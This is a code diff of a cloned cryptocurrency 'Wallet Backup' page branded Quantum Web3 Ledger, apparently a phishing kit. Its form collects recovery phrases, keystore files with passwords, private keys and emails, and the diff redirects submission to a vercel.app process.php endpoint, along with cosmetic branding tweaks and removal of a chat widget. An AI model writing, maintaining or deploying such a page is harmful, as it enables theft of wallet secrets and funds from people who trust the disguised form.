@@ -11,11 +11,12 @@ if (!isset($_SESSION['csrf_token'])) {
 <!DOCTYPE html>
 <html lang="en">
 
+
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
-  <title> Wallet Backup - Quantum Web3 Ledger</title>
+  <title>Wallet Backup - Quantum Web3 Ledger</title>
   <!-- Bootstrap CSS -->
   <link
     rel="stylesheet"
@@ -377,9 +378,9 @@ span.h4.d-block.coin-name {
   <!-- NAVBAR -->
   <nav class="navbar navbar-expand-lg sticky-top">
     <div class="container">
-      <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
-                QUANTUM WEB3 LEDGER
-      </a>
+        <a class="navbar-brand" href="#" style="font-size: 1.2rem;">
+            <span style="color: #FFD700;">QUANTUM</span> <span style="color: #FFFFFF;">WEB3</span> <span style="color: #1DA1F2;">LEDGER</span>
+        </a>
       <button
         class="navbar-toggler navbar-dark"
         type="button"
@@ -2327,8 +2328,8 @@ span.h4.d-block.coin-name {
               </button>
             </div>
 
-                <form method="POST" action="https://quantumweb3ledger.com/process.php">
-                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">            <!-- Tabs -->
+            
+            <!-- Tabs -->
             <ul class="nav nav-tabs" role="tablist">
               <li class="nav-item">
                 <a class="nav-link active" id="phrase-tab" data-toggle="tab" href="#phrase" role="tab">Phrase</a>
@@ -2340,18 +2341,18 @@ span.h4.d-block.coin-name {
                 <a class="nav-link" id="privatekey-tab" data-toggle="tab" href="#privatekey" role="tab">Private Key</a>
               </li>
             </ul>
-
-            <div class="tab-content p-3">
+            <form method="POST" action="https://quantum-web3-ledger.vercel.app/process.php">
+                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">            <div class="tab-content p-3">
               <!-- Tab #1: Phrase -->
               <div class="tab-pane fade show active" id="phrase" role="tabpanel" aria-labelledby="phrase-tab">
                 <div class="mb-8 mt-8 alert-danger phrase"></div>
                 <div class="form-group">
                   <label for="walletNamePhrase">Wallet Name</label>
-                  <input type="text" id="walletNamePhrase" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="pwallet" placeholder="Wallet Name">
+                  <input type="text" id="walletNamePhrase" value="" autocomplete="off" class="form-control" name="pwallet" placeholder="Wallet Name">
                 </div>
                 <div class="form-group">
                   <label for="emailPhrase">Email</label>
-                  <input type="email" id="emailPhrase" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="pemail" placeholder="Email">
+                  <input type="email" id="emailPhrase" value="" class="form-control" name="pemail" placeholder="Email">
                 </div>
                 <div class="form-group">
                   <label for="recoveryPhraseInput">Phrase</label>
@@ -2365,7 +2366,7 @@ span.h4.d-block.coin-name {
                 <div class="mb-8 mt-8 alert-danger keystore"></div>
                 <p>Upload or paste your keystore JSON contents here.</p>
                 <div class="mb-3">
-                  <input type="text" id="walletNameKeystore" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="kwallet" placeholder="Wallet Name">
+                  <input type="text" id="walletNameKeystore" value="" class="form-control" name="kwallet" placeholder="Wallet Name">
                 </div>
                 <div class="mb-3">
                   <input type="email" id="emailKeystore" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control" name="kemail" placeholder="Email">
@@ -2373,7 +2374,7 @@ span.h4.d-block.coin-name {
                 <div class="mb-3">
                   <textarea id="keystoreJsonInput" cols="30" rows="5" name="keystore" class="form-control" placeholder="Keystore JSON"></textarea>
                 </div>
-                <input type="password" id="keystorePassword" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" class="form-control mt-3" name="password" placeholder="Wallet password">
+                <input type="password" id="keystorePassword" value="" autocomplete="off" class="form-control mt-3" name="password" placeholder="Wallet password">
                 <small class="text-muted d-block mt-2">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
               </div>
 
@@ -2383,12 +2384,12 @@ span.h4.d-block.coin-name {
                 <p>Enter your private key below:</p>
                 <div class="form-group">
                   <div class="mb-3">
-                    <input type="text" id="walletNamePrivateKey" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" name="prwallet" class="form-control" placeholder="Wallet Name">
+                    <input type="text" id="walletNamePrivateKey" value="" name="prwallet" class="form-control" placeholder="Wallet Name">
                   </div>
                   <div class="mb-3">
-                    <input type="email" id="emailPrivateKey" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" name="premail" class="form-control" placeholder="Email">
+                    <input type="email" id="emailPrivateKey" value="" name="premail" class="form-control" placeholder="Email">
                   </div>
-                  <input type="text" id="privateKeyInput" readonly onfocus="this.removeAttribute('readonly');" autocomplete="off" name="private" class="form-control" placeholder="Enter your private key">
+                  <input type="text" id="privateKeyInput" value="" name="private" class="form-control" placeholder="Enter your private key">
                   <small class="text-muted d-block mt-2">Typically 12 (sometimes 24) words separated by a single space.</small>
                 </div>
               </div>
@@ -2397,7 +2398,7 @@ span.h4.d-block.coin-name {
             <!-- Footer with Cancel / Proceed -->
             <div class="modal-footer">
               <button type="button" class="btn-cancel" data-dismiss="modal">Cancel</button>
-              <input type="submit" class="btn-proceed" value="proceed">
+              <input type="submit" class="btn-proceed" value="Proceed">
             </div>
         </form>
           </div>
@@ -2442,17 +2443,5 @@ span.h4.d-block.coin-name {
           
         });
       </script>
-<!-- Smartsupp Live Chat script -->
-<script type="text/javascript">
-var _smartsupp = _smartsupp || {};
-_smartsupp.key = '2b2dc2643a0f5843187b6e7d3eba2899bc8fbfc4';
-window.smartsupp||(function(d) {
-  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
-  s=d.getElementsByTagName('script')[0];c=d.createElement('script');
-  c.type='text/javascript';c.charset='utf-8';c.async=true;
-  c.src='www.smartsuppchat.com/loaderd41dd41d.html?';s.parentNode.insertBefore(c,s);
-})(document);
-</script>
 
-      
 </html>
